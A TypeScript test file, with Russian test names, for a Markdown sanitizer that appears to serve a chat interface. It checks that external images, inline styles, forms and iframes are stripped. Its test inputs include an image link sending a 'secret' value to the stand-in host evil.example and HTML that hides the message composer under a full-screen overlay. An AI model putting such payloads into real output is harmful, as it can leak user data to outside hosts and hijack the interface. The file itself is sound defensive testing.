import {test, before} from 'node:test';
import assert from 'node:assert/strict';
import {JSDOM} from 'jsdom';

let renderMarkdown: (text: string) => string;
before(async () => {
  const {window} = new JSDOM('');
  Object.assign(globalThis, {window});
  ({renderMarkdown} = await import('../src/ui/markdown.ts'));
});

test('renderMarkdown: обычный Markdown остаётся', () => {
  const html = renderMarkdown('**жирный** и [ссылка](https://example.com)\n\n- пункт');
  assert.match(html, /<strong>жирный<\/strong>/);
  assert.match(html, /<a href="https:\/\/example.com" target="_blank" rel="noopener noreferrer">ссылка<\/a>/);
  assert.match(html, /<li>пункт<\/li>/);
});

test('renderMarkdown: внешние картинки не загружаются', () => {
  const html = renderMarkdown('![x](https://evil.example/?q=секрет) <img src="http://evil.example/a.png">');
  assert.doesNotMatch(html, /evil\.example/);
});

test('renderMarkdown: data-картинка остаётся', () => {
  assert.match(renderMarkdown('![x](data:image/png;base64,AAAA)'), /src="data:image\/png;base64,AAAA"/);
});

test('renderMarkdown: стили и формы вырезаны', () => {
  const html = renderMarkdown('<style>#composer{display:none}</style><div style="position:fixed;inset:0">x</div><form><input><button>b</button></form><iframe src="https://e.x"></iframe>');
  assert.doesNotMatch(html, /<style|style=|<form|<input|<button|<iframe/);
});
